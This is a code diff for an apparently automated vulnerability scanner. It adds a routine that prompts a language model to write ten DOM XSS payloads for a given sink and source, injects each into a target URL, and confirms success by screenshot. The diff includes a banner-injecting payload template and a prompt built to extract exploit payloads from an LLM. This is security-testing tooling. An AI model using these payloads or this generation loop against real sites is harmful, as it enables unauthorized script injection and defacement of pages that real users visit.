@@ -1705,11 +1705,45 @@ Each payload should target a different context or use a different breakout techn
                         "SUCCESS"
                     )
                 else:
-                    # Not visually confirmed - log as candidate only
-                    logger.warning(
-                        f"[{self.name}] DOM XSS candidate not visually confirmed: "
-                        f"sink={df['sink']}, payload={df['payload'][:50]}..."
+                    # Not visually confirmed with original payload
+                    # Try generating alternative visual payloads via DeepSeek
+                    logger.info(
+                        f"[{self.name}] Original payload not visually confirmed, "
+                        f"trying alternative payloads for sink={df['sink']}..."
                     )
+
+                    alt_evidence = await self._try_alternative_dom_payloads(
+                        url=df["url"],
+                        sink=df["sink"],
+                        source=df["source"],
+                        original_payload=df["payload"],
+                        screenshots_dir=screenshots_dir
+                    )
+
+                    if alt_evidence and alt_evidence.get("vision_confirmed"):
+                        confirmed_count += 1
+                        self.findings.append(XSSFinding(
+                            url=df["url"],
+                            parameter=df["source"],
+                            payload=alt_evidence.get("working_payload", df["payload"]),
+                            context="dom_xss",
+                            validation_method="dom_xss_alt_payload_vision",
+                            evidence=alt_evidence,
+                            confidence=0.99,
+                            status="VALIDATED_CONFIRMED",
+                            validated=True,
+                            reflection_context=df["source"],
+                            successful_payloads=[alt_evidence.get("working_payload")]
+                        ))
+                        dashboard.log(
+                            f"[{self.name}] ✅ DOM XSS CONFIRMED via alternative payload!",
+                            "SUCCESS"
+                        )
+                    else:
+                        logger.warning(
+                            f"[{self.name}] DOM XSS candidate not confirmed after {alt_evidence.get('attempts', 0) if alt_evidence else 0} attempts: "
+                            f"sink={df['sink']}"
+                        )
 
             if confirmed_count > 0:
                 dashboard.log(
@@ -1789,6 +1823,140 @@ Each payload should target a different context or use a different breakout techn
         except Exception as e:
             logger.error(f"[{self.name}] DOM XSS visual validation failed: {e}")
             return None
+
+    async def _try_alternative_dom_payloads(
+        self,
+        url: str,
+        sink: str,
+        source: str,
+        original_payload: str,
+        screenshots_dir: Path = None
+    ) -> Optional[Dict[str, Any]]:
+        """
+        Generate and test alternative payloads when original doesn't work visually.
+
+        Uses DeepSeek to generate 10 visual payloads for the specific sink/source
+        combination, then tests each until one is visually confirmed.
+
+        Args:
+            url: Base URL (without payload)
+            sink: DOM sink (e.g., "eval", "innerHTML")
+            source: DOM source (e.g., "postMessage", "location.hash")
+            original_payload: The payload that didn't work
+            screenshots_dir: Directory for screenshots
+
+        Returns:
+            Evidence dict with working_payload if found, None otherwise
+        """
+        from bugtrace.core.llm_client import llm_client
+        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+        dashboard.log(
+            f"[{self.name}] 🎨 Generating alternative payloads for {sink}...",
+            "INFO"
+        )
+
+        # Generate visual payloads via DeepSeek
+        prompt = f"""You are a DOM XSS expert. I found a DOM XSS vulnerability:
+- Sink: {sink}
+- Source: {source}
+- Original payload that was detected but not visually confirmed: {original_payload[:100]}
+
+Generate exactly 10 XSS payloads that will:
+1. Exploit this specific sink ({sink}) via the source ({source})
+2. Create a VISIBLE RED BANNER with text "HACKED BY BUGTRACEAI"
+
+The banner MUST be visible. Use this style:
+document.body.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999">HACKED BY BUGTRACEAI</div>'+document.body.innerHTML
+
+Adapt the payload to work with the {sink} sink. For example:
+- For eval: use string that creates the div
+- For innerHTML: inject the div HTML directly
+- For postMessage: craft message that triggers the sink
+
+Return ONLY the payloads, one per line, no explanations."""
+
+        try:
+            response = await llm_client.generate(
+                prompt=prompt,
+                module_name="DOM-XSS-AltPayloads",
+                model_override=settings.MUTATION_MODEL,
+                temperature=0.7,
+                max_tokens=2000
+            )
+
+            if not response:
+                return {"attempts": 0, "error": "LLM returned empty response"}
+
+            # Parse payloads
+            payloads = []
+            for line in response.strip().split("\n"):
+                line = line.strip()
+                if line and not line.startswith("#") and len(line) > 5:
+                    # Remove numbering
+                    if len(line) > 2 and line[0].isdigit() and line[1] in ".):":
+                        line = line[2:].strip()
+                    payloads.append(line)
+
+            payloads = payloads[:10]  # Max 10
+
+            if not payloads:
+                return {"attempts": 0, "error": "No payloads generated"}
+
+            dashboard.log(
+                f"[{self.name}] Testing {len(payloads)} alternative payloads...",
+                "INFO"
+            )
+
+            # Test each payload
+            for i, payload in enumerate(payloads):
+                dashboard.set_current_payload(
+                    f"ALT [{i+1}/{len(payloads)}]",
+                    "DOM XSS Alt",
+                    "Testing"
+                )
+
+                # Build URL with payload
+                # For DOM XSS, payload often goes in hash or specific param
+                parsed = urlparse(url)
+                if source == "location.hash":
+                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}#{payload}"
+                elif source == "postMessage":
+                    # postMessage needs different approach - use original URL
+                    # and inject via script
+                    test_url = url
+                else:
+                    # Try in query string
+                    params = parse_qs(parsed.query)
+                    # Find likely param or use first one
+                    param_name = list(params.keys())[0] if params else "input"
+                    params[param_name] = [payload]
+                    test_url = urlunparse((
+                        parsed.scheme, parsed.netloc, parsed.path,
+                        parsed.params, urlencode(params, doseq=True), parsed.fragment
+                    ))
+
+                # Validate visually
+                evidence = await self._validate_dom_xss_visually(
+                    url=test_url,
+                    payload=payload,
+                    sink=sink,
+                    source=source,
+                    screenshots_dir=screenshots_dir
+                )
+
+                if evidence and evidence.get("vision_confirmed"):
+                    evidence["working_payload"] = payload
+                    evidence["attempts"] = i + 1
+                    evidence["total_alternatives"] = len(payloads)
+                    return evidence
+
+            # None worked
+            return {"attempts": len(payloads), "error": "No payload visually confirmed"}
+
+        except Exception as e:
+            logger.error(f"[{self.name}] Alternative payload generation failed: {e}")
+            return {"attempts": 0, "error": str(e)}
 
     async def _loop_test_additional_vectors(self, interactsh_domain: str, screenshots_dir: Path):
         """Phase 4: Additional attack vectors (POST, Headers)."""
